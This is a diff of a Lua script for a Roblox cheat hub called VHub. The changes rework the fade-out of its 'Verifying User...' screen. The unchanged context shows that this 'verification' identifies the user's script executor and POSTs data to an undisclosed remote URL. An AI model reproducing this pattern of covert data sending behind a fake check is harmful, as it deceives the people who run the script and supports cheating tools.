@@ -66,7 +66,8 @@ Continue.TextScaled = true
 Continue.TextSize = 14.000
 Continue.TextWrapped = true
 Continue.MouseButton1Down:connect(function()
-Continue.Text = "Verifying User..."
+Continue:Destroy()
+BeautifulMessage.Text = "Verifying User..."
 local exploits = identifyexecutor()
 
 local url =
@@ -101,52 +102,43 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-Continue.Text = "Verified!"
+BeautifulMessage.Text = "Verified!"
 wait(1)
 BlackTransparentScreen.Transparency = 0.1
 BeautifulMessage.TextTransparency = 0.1
 VHubLogo.ImageTransparency = 0.1
-Continue.Transparency = 0.1
 wait(0.1)
 BlackTransparentScreen.Transparency = 0.2
 BeautifulMessage.TextTransparency = 0.2
 VHubLogo.ImageTransparency = 0.2
-Continue.Transparency = 0.2
 wait(0.1)
 BlackTransparentScreen.Transparency = 0.3
 BeautifulMessage.TextTransparency = 0.3
 VHubLogo.ImageTransparency = 0.3
-Continue.Transparency = 0.3
 wait(0.1)
 BlackTransparentScreen.Transparency = 0.4
 BeautifulMessage.TextTransparency = 0.4
 VHubLogo.ImageTransparency = 0.4
-Continue.Transparency = 0.4
 wait(0.1)
 BlackTransparentScreen.Transparency = 0.5
 BeautifulMessage.TextTransparency = 0.5
 VHubLogo.ImageTransparency = 0.5
-Continue.Transparency = 0.5
 wait(0.1)
 BlackTransparentScreen.Transparency = 0.6
 BeautifulMessage.TextTransparency = 0.6
 VHubLogo.ImageTransparency = 0.6
-Continue.Transparency = 0.6
 wait(0.1)
 BlackTransparentScreen.Transparency = 0.7
 BeautifulMessage.TextTransparency = 0.7
 VHubLogo.ImageTransparency = 0.7
-Continue.Transparency = 0.7
 wait(0.1)
 BlackTransparentScreen.Transparency = 0.8
 BeautifulMessage.TextTransparency = 0.8
 VHubLogo.ImageTransparency = 0.8
-Continue.Transparency = 0.8
 wait(0.1)
 BlackTransparentScreen.Transparency = 0.9
 BeautifulMessage.TextTransparency = 0.9
 VHubLogo.ImageTransparency = 0.9
-Continue.Transparency = 0.9
 wait(0.1)
 ScreenGui:Destroy()
 game.CoreGui.VHubCoreScreen.MainPage.MainFrame.Visible = true
